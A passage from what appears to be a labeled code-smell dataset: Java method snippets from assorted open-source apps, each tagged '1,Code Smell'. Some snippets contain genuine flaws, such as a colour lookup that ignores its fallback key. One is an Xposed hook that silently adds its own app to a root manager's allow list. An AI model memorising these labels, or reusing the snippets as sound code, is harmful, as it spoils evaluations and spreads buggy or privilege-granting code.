    worldIn.setBlockAndUpdate(basePos,worldIn.getBlockState(basePos).setValue(MechanicalPistonBlock.STATE,PistonState.RETRACTED));
    BlockEntity be=worldIn.getBlockEntity(basePos);
    if (be instanceof MechanicalPistonBlockEntity) {
      MechanicalPistonBlockEntity baseBE=(MechanicalPistonBlockEntity)be;
      baseBE.offset=0;
      baseBE.onLengthBroken();
    }
  }
  super.playerWillDestroy(worldIn,pos,state,player);
}",1,Code Smell
"private static ApacheHttpClientRequest getApacheHttpClientRequest(ClassicHttpRequest request,Scope scope){
  HttpHost host=null;
  if (scope.route.getTargetHost() != null) {
    host=scope.route.getTargetHost();
  }
 else   if (scope.clientContext.getHttpRoute().getTargetHost() != null) {
    host=scope.clientContext.getHttpRoute().getTargetHost();
  }
  if (host != null && ((host.getSchemeName().equals(""https"") && host.getPort() == 443) || (host.getSchemeName().equals(""http"") && host.getPort() == 80))) {
    host=new HttpHost(host.getSchemeName(),host.getHostName(),-1);
  }
  return new ApacheHttpClientRequest(host,request);
}",1,Code Smell
"private void updateSendButton(){
  int size=(int)(Math.min(AndroidUtilities.displaySize.x,AndroidUtilities.displaySize.y) / 2 / AndroidUtilities.density);
  if (importingStickers != null) {
    previewSendButton.setText(LocaleController.getString(""ImportStickersRemove"",R.string.ImportStickersRemove));
    previewSendButton.setTextColor(getThemedColor(Theme.key_text_RedBold));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    previewSendButton.setVisibility(View.VISIBLE);
    previewSendButtonShadow.setVisibility(View.VISIBLE);
  }
 else   if (delegate != null && (stickerSet == null || !stickerSet.set.masks)) {
    previewSendButton.setText(LocaleController.getString(""SendSticker"",R.string.SendSticker));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    previewSendButton.setVisibility(View.VISIBLE);
    previewSendButtonShadow.setVisibility(View.VISIBLE);
  }
 else {
    previewSendButton.setText(LocaleController.getString(""Close"",R.string.Close));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER));
    previewSendButton.setVisibility(View.GONE);
    previewSendButtonShadow.setVisibility(View.GONE);
  }
}",1,Code Smell
"public static Integer getColorOrNull(String key){
  Integer color=currentColors.get(key);
  if (color == null) {
    String fallbackKey=fallbackKeys.get(key);
    if (fallbackKey != null) {
      color=currentColors.get(key);
    }
    if (color == null) {
      color=defaultColors.get(key);
    }
  }
  if (color != null && (key_windowBackgroundWhite.equals(key) || key_windowBackgroundGray.equals(key) || key_actionBarDefault.equals(key)|| key_actionBarDefaultArchived.equals(key))) {
    color|=0xff000000;
  }
  return color;
}",1,Code Smell
"/** 
 * Append message to memory cache
 * @param memStatsHolder    statistical information object
 * @param partitionId       the partitionId for append messages
 * @param keyCode           the filter item hash code
 * @param timeRecv          the received timestamp
 * @param indexEntry        the stored index entry
 * @param dataEntryLength   the stored data entry length
 * @param dataEntry         the stored data entry
 * @param appendResult      the append result
 * @return    the process result
 */
public boolean appendMsg(MsgStoreStatsHolder memStatsHolder,int partitionId,int keyCode,long timeRecv,ByteBuffer indexEntry,int dataEntryLength,ByteBuffer dataEntry,AppendResult appendResult){
  long dataOffset;
  long indexOffset;
  int indexSizePos;
  boolean isAppended=true;
  boolean fullDataSize=false;
  boolean fullIndexSize=false;
  boolean fullCount=false;
  this.writeLock.lock();
  try {
    fullDataSize=(this.cacheDataOffset.get() + dataEntryLength > this.maxDataCacheSize);
    fullCount=(this.curMessageCount.get() + 1 > maxAllowedMsgCount);
    fullIndexSize=(this.cacheIndexOffset.get() + DataStoreUtils.STORE_INDEX_HEAD_LEN > this.maxIndexCacheSize);
    if (fullDataSize || fullCount || fullIndexSize) {
      isAppended=false;
      return false;
    }
    indexOffset=this.writeIndexStartPos + this.cacheIndexOffset.get();
    dataOffset=this.writeDataStartPos + this.cacheDataOffset.get();
    indexEntry.putLong(DataStoreUtils.INDEX_POS_DATAOFFSET,dataOffset);
    dataEntry.putLong(DataStoreUtils.STORE_HEADER_POS_QUEUE_LOGICOFF,indexOffset);
    this.cacheDataSegment.put(dataEntry.array());
    this.cachedIndexSegment.put(indexEntry.array());
    this.cacheDataOffset.getAndAdd(dataEntryLength);
    indexSizePos=cacheIndexOffset.getAndAdd(DataStoreUtils.STORE_INDEX_HEAD_LEN);
    this.queuesMap.put(partitionId,indexSizePos);
    this.keysMap.put(keyCode,indexSizePos);
    this.curMessageCount.getAndIncrement();
    this.rightAppendTime.set(timeRecv);
    if (indexSizePos == 0) {
      this.leftAppendTime.set(timeRecv);
    }
  }
  finally {
    this.writeLock.unlock();
    if (!isAppended) {
      memStatsHolder.addCacheFullType(fullDataSize,fullIndexSize,fullCount);
    }
  }
  appendResult.putAppendResult(indexOffset,dataOffset);
  return true;
}",1,Code Smell
"private void readJournal() throws IOException {
  StrictLineReader reader=new StrictLineReader(new FileInputStream(journalFile),Util.US_ASCII);
  try {
    String magic=reader.readLine();
    String version=reader.readLine();
    String appVersionString=reader.readLine();
    String valueCountString=reader.readLine();
    String blank=reader.readLine();
    if (!MAGIC.equals(magic) || !VERSION_1.equals(version) || !Integer.toString(appVersion).equals(appVersionString)|| !Integer.toString(valueCount).equals(valueCountString)|| !"""".equals(blank)) {
      throw new IOException(""unexpected journal header: ["" + magic + "", ""+ version+ "", ""+ valueCountString+ "", ""+ blank+ ""]"");
    }
    int lineCount=0;
    while (true) {
      try {
        readJournalLine(reader.readLine());
        lineCount++;
      }
 catch (      EOFException endOfJournal) {
        break;
      }
    }
    redundantOpCount=lineCount - lruEntries.size();
    if (reader.hasUnterminatedLine()) {
      rebuildJournal();
    }
 else {
      journalWriter=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(journalFile,true),Util.US_ASCII));
    }
  }
  finally {
    Util.closeQuietly(reader);
  }
}",1,Code Smell
"private int getDaysForMonth(int month,int year){
  if (month == 1) {
    boolean is29Feb=false;
    if (year < 1582) {
      is29Feb=(year < 1 ? year + 1 : year) % 4 == 0;
    }
 else     if (year > 1582) {
      is29Feb=year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    }
    return is29Feb ? 29 : 28;
  }
  if (month == 3 || month == 5 || month == 8 || month == 10) {
    return 30;
  }
 else {
    return 31;
  }
}",1,Code Smell
"public void updateItems(){
  final int state=SMSJobController.getInstance(currentAccount).getState();
  oldItems.clear();
  oldItems.addAll(items);
  items.clear();
  items.add(new Item(VIEW_TYPE_HEADER));
  items.add(new Item(VIEW_TYPE_TABLE));
  items.add(Item.asShadow(null));
  items.add(Item.asButton(BUTTON_TERMS,R.drawable.menu_intro,LocaleController.getString(R.string.SmsToS)));
  items.add(Item.asButton(BUTTON_PREMIUM,R.drawable.menu_premium_main,LocaleController.getString(R.string.SmsPremiumBenefits)));
  if (state == SMSJobController.STATE_JOINED && !SMSJobController.getInstance(currentAccount).journal.isEmpty()) {
    items.add(Item.asButton(BUTTON_HISTORY,R.drawable.menu_sms_history,LocaleController.getString(R.string.SmsHistory)).setError(SMSJobController.getInstance(currentAccount).hasError()));
  }
  if (state == SMSJobController.STATE_JOINED) {
    final int simsCount=SMSJobController.getInstance(currentAccount).simsCount();
    if (simsCount > 1 || simsCount == 1 && Build.VERSION.SDK_INT < 22) {
      items.add(Item.asButton(BUTTON_SIM,R.drawable.menu_storage_path,LocaleController.getString(R.string.SmsActiveSim)));
    }
  }
  items.add(Item.asShadow(null));
  items.add(Item.asSwitch(BUTTON_ALLOW_INTERNATIONAL,LocaleController.getString(R.string.SmsAllowInternational)));
  items.add(Item.asShadow(LocaleController.getString(R.string.SmsCostsInfo)));
  if (state != SMSJobController.STATE_NONE) {
    items.add(Item.asButton(BUTTON_DEACTIVATE,0,LocaleController.getString(R.string.SmsDeactivate)).makeRed());
  }
  items.add(Item.asShadow(null));
  if (adapter != null) {
    adapter.setItems(oldItems,items);
  }
}",1,Code Smell
"@Override public boolean remove(int x,int y,int z){
  long tableAddr=this.tableAddr;
  if (tableAddr == 0L) {
    return false;
  }
  long mask=this.tableSize - 1L;
  long flag=positionFlag(x,y,z);
  int searchBucketX=x >> BUCKET_AXIS_BITS;
  int searchBucketY=y >> BUCKET_AXIS_BITS;
  int searchBucketZ=z >> BUCKET_AXIS_BITS;
  long hash=hashPosition(searchBucketX,searchBucketY,searchBucketZ);
  for (long i=0L; ; i++) {
    long bucketAddr=tableAddr + ((hash + i) & mask) * BUCKET_BYTES;
    int bucketX=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET);
    int bucketY=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Y_OFFSET);
    int bucketZ=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Z_OFFSET);
    long value=PUnsafe.getLong(bucketAddr + BUCKET_VALUE_OFFSET);
    if (value == 0L) {
      return false;
    }
 else     if (bucketX != searchBucketX || bucketY != searchBucketY || bucketZ != searchBucketZ) {
      continue;
    }
 else     if ((value & flag) == 0L) {
      return false;
    }
    this.size--;
    if ((value & ~flag) == 0L) {
      this.usedBuckets--;
      this.shiftBuckets(tableAddr,(hash + i) & mask,mask);
    }
 else {
      PUnsafe.putLong(bucketAddr + BUCKET_VALUE_OFFSET,value & ~flag);
    }
    return true;
  }
}
@Override public boolean remove(@NonNull int... point){
  checkArg(point.length == 3);
  return this.remove(point[0],point[1],point[2]);
}",1,Code Smell
"@Override public void onPositionDiscontinuity(@Player.DiscontinuityReason int reason){
  discontinuityReasons.add(reason);
  int currentIndex=player.getCurrentPeriodIndex();
  if (reason == Player.DISCONTINUITY_REASON_PERIOD_TRANSITION || periodIndices.isEmpty() || periodIndices.get(periodIndices.size() - 1) != currentIndex) {
    periodIndices.add(currentIndex);
  }
}",1,Code Smell
"@NonNull @Override protected InteractionResult mobInteract(@NonNull Hand hand,@NonNull GeyserItemStack itemInHand){
  boolean isBaby=isBaby();
  if (!isBaby && itemInHand.asItem() == Items.BOWL) {
    return InteractionResult.SUCCESS;
  }
 else   if (!isBaby && isAlive() && itemInHand.asItem() == Items.SHEARS) {
    return InteractionResult.SUCCESS;
  }
 else   if (isBrown && session.getTagCache().is(ItemTag.SMALL_FLOWERS,itemInHand)) {
    return InteractionResult.SUCCESS;
  }
  return super.mobInteract(hand,itemInHand);
}
",1,Code Smell
"private byte[] convert0() throws IOException {
  ArrayList<PositionList.Entry> sortedPositions=buildSortedPositions();
  ArrayList<LocalList.Entry> methodArgs=extractMethodArguments();
  emitHeader(sortedPositions,methodArgs);
  output.writeByte(DBG_SET_PROLOGUE_END);
  if (annotateTo != null || debugPrint != null) {
    annotate(1,String.format(""%04x: prologue end"",address));
  }
  int positionsSz=sortedPositions.size();
  int localsSz=locals.size();
  int curPositionIdx=0;
  int curLocalIdx=0;
  for (; ; ) {
    curLocalIdx=emitLocalsAtAddress(curLocalIdx);
    curPositionIdx=emitPositionsAtAddress(curPositionIdx,sortedPositions);
    int nextAddrL=Integer.MAX_VALUE;
    int nextAddrP=Integer.MAX_VALUE;
    if (curLocalIdx < localsSz) {
      nextAddrL=locals.get(curLocalIdx).getAddress();
    }
    if (curPositionIdx < positionsSz) {
      nextAddrP=sortedPositions.get(curPositionIdx).getAddress();
    }
    int next=Math.min(nextAddrP,nextAddrL);
    if (next == Integer.MAX_VALUE) {
      break;
    }
    if (next == codeSize && nextAddrL == Integer.MAX_VALUE && nextAddrP == Integer.MAX_VALUE) {
      break;
    }
    if (next == nextAddrP) {
      emitPosition(sortedPositions.get(curPositionIdx++));
    }
 else {
      emitAdvancePc(next - address);
    }
  }
  emitEndSequence();
  return output.toByteArray();
}",1,Code Smell
"public void revokeMessage(final TUIMessageBean message){
  if (!safetyCall()) {
    TUIChatLog.w(TAG,""revokeMessage unSafetyCall"");
    return;
  }
  provider.revokeMessage(message,new IUIKitCallback<Void>(){
    @Override public void onSuccess(    Void data){
      if (message instanceof ReplyMessageBean) {
        modifyRootMessageToRemoveReplyInfo((ReplyMessageBean)message,new IUIKitCallback<Void>(){
          @Override public void onError(          String module,          int errCode,          String errMsg){
            ToastUtil.toastShortMessage(""modify message failed code = "" + errCode + "" message = ""+ errMsg);
          }
        }
);
      }
    }
    @Override public void onError(    String module,    int errCode,    String errMsg){
      if (errCode == ChatProvider.ERR_REVOKE_TIME_LIMIT_EXCEED || errCode == ChatProvider.ERR_REVOKE_TIME_LIMIT_SVR_GROUP || errCode == ChatProvider.ERR_REVOKE_TIME_LIMIT_SVR_MESSAGE) {
        ToastUtil.toastLongMessage(TUIChatService.getAppContext().getString(R.string.send_two_mins));
      }
 else {
        ToastUtil.toastLongMessage(TUIChatService.getAppContext().getString(R.string.revoke_fail) + errCode + ""=""+ errMsg);
      }
    }
  }
);
}
",1,Code Smell
"static View getTopViewInTouch(ConsecutiveScrollerLayout csl,int touchX,int touchY){
  int count=csl.getChildCount();
  View topTouchView=null;
  for (int i=0; i < count; i++) {
    View child=csl.getChildAt(i);
    if (child.getVisibility() == View.VISIBLE && isTouchPointInView(child,touchX,touchY)) {
      if (topTouchView == null) {
        topTouchView=child;
        continue;
      }
      if (ViewCompat.getZ(child) > ViewCompat.getZ(topTouchView) || (ViewCompat.getZ(child) == ViewCompat.getZ(topTouchView) && csl.getDrawingPosition(child) > csl.getDrawingPosition(topTouchView))) {
        topTouchView=child;
      }
    }
  }
  return topTouchView;
}",1,Code Smell
"@Override public void load() throws IOException, InterruptedException {
  int result=Extractor.RESULT_CONTINUE;
  while (result == Extractor.RESULT_CONTINUE && !loadCanceled) {
    ExtractorInput input=null;
    try {
      long position=positionHolder.position;
      dataSpec=buildDataSpec(position);
      length=dataSource.open(dataSpec);
      if (length != C.LENGTH_UNSET) {
        length+=position;
      }
      Uri uri=Assertions.checkNotNull(dataSource.getUri());
      icyHeaders=IcyHeaders.parse(dataSource.getResponseHeaders());
      DataSource extractorDataSource=dataSource;
      if (icyHeaders != null && icyHeaders.metadataInterval != C.LENGTH_UNSET) {
        extractorDataSource=new IcyDataSource(dataSource,icyHeaders.metadataInterval,this);
        icyTrackOutput=icyTrack();
        icyTrackOutput.format(ICY_FORMAT);
      }
      input=new DefaultExtractorInput(extractorDataSource,position,length);
      Extractor extractor=extractorHolder.selectExtractor(input,extractorOutput,uri);
      if (icyHeaders != null && extractor instanceof Mp3Extractor) {
        ((Mp3Extractor)extractor).disableSeeking();
      }
      if (pendingExtractorSeek) {
        extractor.seek(position,seekTimeUs);
        pendingExtractorSeek=false;
      }
      while (result == Extractor.RESULT_CONTINUE && !loadCanceled) {
        loadCondition.block();
        result=extractor.read(input,positionHolder);
        if (input.getPosition() > position + continueLoadingCheckIntervalBytes) {
          position=input.getPosition();
          loadCondition.close();
          handler.post(onContinueLoadingRequestedRunnable);
        }
      }
    }
  finally {
      if (result == Extractor.RESULT_SEEK) {
        result=Extractor.RESULT_CONTINUE;
      }
 else       if (input != null) {
        positionHolder.position=input.getPosition();
      }
      Util.closeQuietly(dataSource);
    }
  }
}",1,Code Smell
"void attachListeners(){
  var parent=getParentFragment();
  if (parent instanceof LogsFragment) {
    logsFragment.binding.appBar.setLifted(!binding.recyclerView.getBorderViewDelegate().isShowingTopBorder());
    binding.recyclerView.getBorderViewDelegate().setBorderVisibilityChangedListener((top,oldTop,bottom,oldBottom) -> logsFragment.binding.appBar.setLifted(!top));
    logsFragment.setOptionsItemSelectListener(item -> {
      int itemId=item.getItemId();
      if (itemId == R.id.menu_scroll_top) {
        scrollToTop(logsFragment);
      }
 else       if (itemId == R.id.menu_scroll_down) {
        scrollToBottom(logsFragment);
      }
 else       if (itemId == R.id.menu_clear) {
        if (ConfigManager.clearLogs(verbose)) {
          logsFragment.showHint(R.string.logs_cleared,true);
          adaptor.fullRefresh();
        }
 else {
          logsFragment.showHint(R.string.logs_clear_failed_2,true);
        }
        return true;
      }
      return false;
    }
);
    View.OnClickListener l=v -> scrollToTop(logsFragment);
    logsFragment.binding.clickView.setOnClickListener(l);
    logsFragment.binding.toolbar.setOnClickListener(l);
  }
}",1,Code Smell
"private void showProgressView(boolean show){
  if (progressView == null) {
    return;
  }
  if (DISABLE_PROGRESS_VIEW && !AndroidUtilities.isTablet() && !isComments&& currentUser == null && LiteMode.isEnabled(LiteMode.FLAGS_CHAT)) {
    animateProgressViewTo=show;
    return;
  }
  if (fragmentOpened && SharedConfig.animationsEnabled()) {
    if (show == animateProgressViewTo) {
      return;
    }
    animateProgressViewTo=show;
    if (show) {
      if (progressView.getVisibility() != View.VISIBLE) {
        progressView.setVisibility(View.VISIBLE);
        progressView.setAlpha(0f);
        progressView.setScaleX(0.3f);
        progressView.setScaleY(0.3f);
      }
      progressView.animate().setListener(null).cancel();
      progressView.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(150).start();
    }
 else {
      progressView.animate().setListener(null).cancel();
      progressView.animate().alpha(0).scaleX(0.3f).scaleY(0.3f).setDuration(150).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          progressView.setVisibility(View.INVISIBLE);
        }
      }
).start();
    }
  }
 else {
    animateProgressViewTo=show;
    progressView.setVisibility(show ? View.VISIBLE : View.INVISIBLE);
  }
}",1,Code Smell
"/** 
 * Get a list of bluetooth printers.
 * @return an array of EscPosPrinterCommands
 */
@SuppressLint(""MissingPermission"") @Nullable public BluetoothConnection[] getList(){
  BluetoothConnection[] bluetoothDevicesList=super.getList();
  if (bluetoothDevicesList == null) {
    return null;
  }
  int i=0;
  BluetoothConnection[] printersTmp=new BluetoothConnection[bluetoothDevicesList.length];
  for (  BluetoothConnection bluetoothConnection : bluetoothDevicesList) {
    BluetoothDevice device=bluetoothConnection.getDevice();
    int majDeviceCl=device.getBluetoothClass().getMajorDeviceClass(), deviceCl=device.getBluetoothClass().getDeviceClass();
    if (majDeviceCl == BluetoothClass.Device.Major.IMAGING && (deviceCl == 1664 || deviceCl == BluetoothClass.Device.Major.IMAGING)) {
      printersTmp[i++]=new BluetoothConnection(device);
    }
  }
  BluetoothConnection[] bluetoothPrinters=new BluetoothConnection[i];
  System.arraycopy(printersTmp,0,bluetoothPrinters,0,i);
  return bluetoothPrinters;
}",1,Code Smell
"public J visitMethodInvocation(J.MethodInvocation method,P p){
  J.MethodInvocation m=method;
  m=m.withPrefix(visitSpace(m.getPrefix(),Space.Location.METHOD_INVOCATION_PREFIX,p));
  m=m.withMarkers(visitMarkers(m.getMarkers(),p));
  Statement temp=(Statement)visitStatement(m,p);
  if (!(temp instanceof J.MethodInvocation)) {
    return temp;
  }
 else {
    m=(J.MethodInvocation)temp;
  }
  Expression temp2=(Expression)visitExpression(m,p);
  if (!(temp2 instanceof J.MethodInvocation)) {
    return temp2;
  }
 else {
    m=(J.MethodInvocation)temp2;
  }
  if (m.getPadding().getSelect() != null && m.getPadding().getSelect().getElement() instanceof NameTree && method.getMethodType() != null && method.getMethodType().hasFlags(Flag.Static)) {
    m=m.getPadding().withSelect((JRightPadded<Expression>)(JRightPadded<?>)visitTypeName((JRightPadded<NameTree>)(JRightPadded<?>)m.getPadding().getSelect(),p));
  }
  if (m.getPadding().getSelect() != null) {
    m=m.getPadding().withSelect(visitRightPadded(m.getPadding().getSelect(),JRightPadded.Location.METHOD_SELECT,p));
  }
  if (m.getPadding().getTypeParameters() != null) {
    m=m.getPadding().withTypeParameters(visitContainer(m.getPadding().getTypeParameters(),JContainer.Location.TYPE_PARAMETERS,p));
  }
  m=m.getPadding().withTypeParameters(visitTypeNames(m.getPadding().getTypeParameters(),p));
  m=m.withName((J.Identifier)visitNonNull(m.getName(),p));
  m=m.getPadding().withArguments(visitContainer(m.getPadding().getArguments(),JContainer.Location.METHOD_INVOCATION_ARGUMENTS,p));
  m=m.withMethodType((JavaType.Method)visitType(m.getMethodType(),p));
  return m;
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  Intent launchIntent=((Activity)param.thisObject).getIntent();
  if (launchIntent.hasExtra(Constants.PX_ROOT_EXTRA)) {
    new Thread(() -> {
      try {
        Object nativeObject=ObjenesisHelper.newInstance(NativesClass);
        int[] rootUIDs=(int[])callMethod(nativeObject,""getAllowList"");
        PackageManager packageManager=mContext.getPackageManager();
        int ownUID=packageManager.getPackageUid(BuildConfig.APPLICATION_ID,PackageManager.GET_ACTIVITIES);
        boolean haveRoot=Arrays.stream(rootUIDs).anyMatch(uid -> uid == ownUID);
        if (!haveRoot) {
          Object ownRootProfile=ProfileClass.getConstructor(String.class,int.class,boolean.class,boolean.class,String.class,int.class,int.class,List.class,List.class,String.class,int.class,boolean.class,boolean.class,String.class).newInstance(BuildConfig.APPLICATION_ID,ownUID,true,true,null,0,0,new ArrayList<>(),new ArrayList<>(),""u:r:su:s0"",0,true,true,"""");
          callMethod(nativeObject,""setAppProfile"",ownRootProfile);
          restartPX(launchIntent.hasExtra(""launchApp""));
        }
        Thread.sleep(2000);
        SystemUtils.killSelf();
      }
 catch (      Throwable ignored) {
      }
    }
).start();
  }
}",1,Code Smell
"public static void enableTransparentDialog(Context context,View rootView){
  if (context == null || rootView == null || VERSION.SDK_INT <= 19) {
    return;
  }
  View mainContainer=rootView.findViewById(R.id.settings_preference_fragment_container);
  View mainFrame=rootView.findViewById(R.id.main_frame);
  View itemsContainer=rootView.findViewById(R.id.list);
  View title=rootView.findViewById(R.id.decor_title_container);
  int transparent=ContextCompat.getColor(context,R.color.transparent);
  int semiTransparent=ContextCompat.getColor(context,R.color.semi_grey);
  if (mainContainer instanceof FrameLayout && VERSION.SDK_INT >= 21) {
    mainContainer.setOutlineProvider(ViewOutlineProvider.BACKGROUND);
  }
  if (mainFrame instanceof LinearLayout) {
    mainFrame.setBackgroundColor(transparent);
  }
  if (itemsContainer instanceof VerticalGridView) {
    ((VerticalGridView)itemsContainer).setOnChildLaidOutListener((parent,view,position,id) -> view.setBackgroundResource(R.drawable.transparent_dialog_item_bg));
  }
  if (title instanceof FrameLayout) {
    title.setBackgroundColor(transparent);
    title.setVisibility(View.GONE);
  }
}",1,Code Smell
"ControlBar(){
  initComponents();
  MigLayout layout=(MigLayout)getLayout();
  LC lc=ConstraintParser.parseLayoutConstraint((String)layout.getLayoutConstraints());
  UnitValue[] insets=lc.getInsets();
  lc.setInsets(new UnitValue[]{new UnitValue(0,UnitValue.PIXEL,null),insets[1],insets[2],insets[3]});
  layout.setLayoutConstraints(lc);
  DefaultComboBoxModel<LookAndFeelInfo> lafModel=new DefaultComboBoxModel<>();
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf Light (F1)"",FlatLightLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf Dark (F2)"",FlatDarkLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf IntelliJ (F3)"",FlatIntelliJLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf Darcula (F4)"",FlatDarculaLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf macOS Light (F5)"",FlatMacLightLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf macOS Dark (F6)"",FlatMacDarkLaf.class.getName()));
  UIManager.LookAndFeelInfo[] lookAndFeels=UIManager.getInstalledLookAndFeels();
  for (  UIManager.LookAndFeelInfo lookAndFeel : lookAndFeels) {
    String name=lookAndFeel.getName();
    String className=lookAndFeel.getClassName();
    if (className.equals(""com.sun.java.swing.plaf.windows.WindowsClassicLookAndFeel"") || className.equals(""com.sun.java.swing.plaf.motif.MotifLookAndFeel""))     continue;
    if ((SystemInfo.isWindows && className.equals(""com.sun.java.swing.plaf.windows.WindowsLookAndFeel"")) || (SystemInfo.isMacOS && className.equals(""com.apple.laf.AquaLookAndFeel"")) || (SystemInfo.isLinux && className.equals(""com.sun.java.swing.plaf.gtk.GTKLookAndFeel"")))     name+="" (F9)"";
 else     if (className.equals(MetalLookAndFeel.class.getName()))     name+="" (F12)"";
 else     if (className.equals(NimbusLookAndFeel.class.getName()))     name+="" (F11)"";
    lafModel.addElement(new LookAndFeelInfo(name,className));
  }
  lookAndFeelComboBox.setModel(lafModel);
  UIManager.addPropertyChangeListener(e -> {
    if (""lookAndFeel"".equals(e.getPropertyName())) {
      EventQueue.invokeLater(() -> {
        updateInfoLabel();
        frame.updateFontMenuItems();
        frame.getRootPane().setDefaultButton(closeButton);
      }
);
    }
  }
);
  UIScale.addPropertyChangeListener(e -> {
    updateInfoLabel();
  }
);
}",1,Code Smell
"public void initialize() throws CormorantBitcoindException {
  networkInfo=getBitcoindService().getNetworkInfo();
  if (networkInfo.version() < 240000) {
    throw new CormorantBitcoindException(""Bitcoin Core versions older than v24 are not supported"");
  }
  BlockchainInfo blockchainInfo=getBitcoindService().getBlockchainInfo();
  pruned=blockchainInfo.pruned();
  VerboseBlockHeader blockHeader=getBitcoindService().getBlockHeader(blockchainInfo.bestblockhash());
  tip=blockHeader.getBlockHeader();
  timer.schedule(new PollTask(),5000,5000);
  if (blockchainInfo.initialblockdownload()) {
    syncingLock.lock();
    try {
      syncing=true;
      syncingCondition.await();
      if (syncing) {
        if (lastPollException instanceof RuntimeException) {
          throw runtimeException;
        }
        throw new RuntimeException(""Error while waiting for sync to complete"",lastPollException);
      }
    }
 catch (    InterruptedException e) {
      throw new RuntimeException(""Interrupted while waiting for sync to complete"");
    }
 finally {
      syncingLock.unlock();
    }
    blockchainInfo=getBitcoindService().getBlockchainInfo();
    blockHeader=getBitcoindService().getBlockHeader(blockchainInfo.bestblockhash());
    tip=blockHeader.getBlockHeader();
  }
  ListWalletDirResult listWalletDirResult=getBitcoindService().listWalletDir();
  if (listWalletDirResult == null) {
    throw new RuntimeException(""Wallet support must be enabled in Bitcoin Core"");
  }
  boolean exists=listWalletDirResult.wallets().stream().anyMatch(walletDirResult -> walletDirResult.name().equals(CORE_WALLET_NAME));
  legacyWalletExists=listWalletDirResult.wallets().stream().anyMatch(walletDirResult -> walletDirResult.name().equals(Bwt.DEFAULT_CORE_WALLET));
  List<String> loadedWallets=getBitcoindService().listWallets();
  boolean loaded=loadedWallets.contains(CORE_WALLET_NAME);
  if (!exists && !loaded) {
    getBitcoindService().createWallet(CORE_WALLET_NAME,true,true,"""",true,true,true,false);
  }
 else {
    if (!loaded) {
      getBitcoindService().loadWallet(CORE_WALLET_NAME,true);
    }
  }
  ListSinceBlock listSinceBlock=getListSinceBlock(null);
  updateStore(listSinceBlock);
}",1,Code Smell
"@Override public void tick(long time){
  if (forceEnd || pathDuration.isZero() || pathDuration.toMillis() + lastUpdateTime > time) {
    return;
  }
  final Pos targetPos=entityCreature.getTarget() != null ? entityCreature.getTarget().getPosition() : null;
  if (targetPos != null && !targetPos.sameBlock(lastTargetPos)) {
    this.lastUpdateTime=time;
    this.lastTargetPos=targetPos;
    this.entityCreature.getNavigator().setPathTo(targetPos);
  }
}
",1,Code Smell
"public void generateJoinMessage(long chatId,boolean ignoreLeft){
  TLRPC.Chat chat=getChat(chatId);
  if (chat == null || !ChatObject.isChannel(chatId,currentAccount) || ChatObject.isNotInChat(chat) && !ignoreLeft || chat.creator) {
    return;
  }
  TLRPC.TL_messageService message=new TLRPC.TL_messageService();
  message.flags=TLRPC.MESSAGE_FLAG_HAS_FROM_ID;
  message.local_id=message.id=getUserConfig().getNewMessageId();
  if (chat instanceof TLRPC.TL_channel && !ignoreLeft) {
    message.date=chat.date;
  }
 else {
    message.date=getConnectionsManager().getCurrentTime();
  }
  message.from_id=new TLRPC.TL_peerUser();
  message.from_id.user_id=getUserConfig().getClientUserId();
  message.peer_id=new TLRPC.TL_peerChannel();
  message.peer_id.channel_id=chatId;
  message.dialog_id=-chatId;
  message.post=true;
  message.action=new TLRPC.TL_messageActionChatAddUser();
  message.action.users.add(getUserConfig().getClientUserId());
  getUserConfig().saveConfig(false);
  ArrayList<MessageObject> pushMessages=new ArrayList<>();
  ArrayList<TLRPC.Message> messagesArr=new ArrayList<>();
  messagesArr.add(message);
  MessageObject obj=new MessageObject(currentAccount,message,true,false);
  pushMessages.add(obj);
  getMessagesStorage().putMessages(messagesArr,true,true,false,0,0,0);
  AndroidUtilities.runOnUIThread(() -> {
    updateInterfaceWithMessages(-chatId,pushMessages,0);
    getNotificationCenter().postNotificationName(NotificationCenter.dialogsNeedReload);
  }
);
}",1,Code Smell
"@Override public String verifyApplicationAuthCode(String authCode,String applicationId,int type){
  String secret=null;
  if (type == ProtoConstants.ApplicationType.ApplicationType_Robot) {
    WFCMessage.Robot robotData=getRobot(applicationId);
    if (robotData != null && !StringUtil.isNullOrEmpty(robotData.getCallback()) && !StringUtil.isNullOrEmpty(robotData.getSecret())) {
      secret=robotData.getSecret();
    }
  }
 else   if (type == ProtoConstants.ApplicationType.ApplicationType_Channel) {
    WFCMessage.ChannelInfo channelData=getChannelInfo(applicationId);
    if (channelData != null && !StringUtil.isNullOrEmpty(channelData.getCallback()) && !StringUtil.isNullOrEmpty(channelData.getSecret())) {
      secret=channelData.getSecret();
    }
  }
 else   if (type == ProtoConstants.ApplicationType.ApplicationType_Admin) {
    secret=AdminAction.getSecretKey();
    applicationId=""wfadmin"";
  }
  secret=ensureSecretLength(secret);
  byte[] data=Base64.getDecoder().decode(authCode);
  data=AES.AESDecrypt(data,secret,true);
  if (data == null || data.length == 0) {
    return null;
  }
 else {
    String str=new String(data);
    String[] strArr=str.split(""\\?\\|\\?"");
    if (strArr.length == 4) {
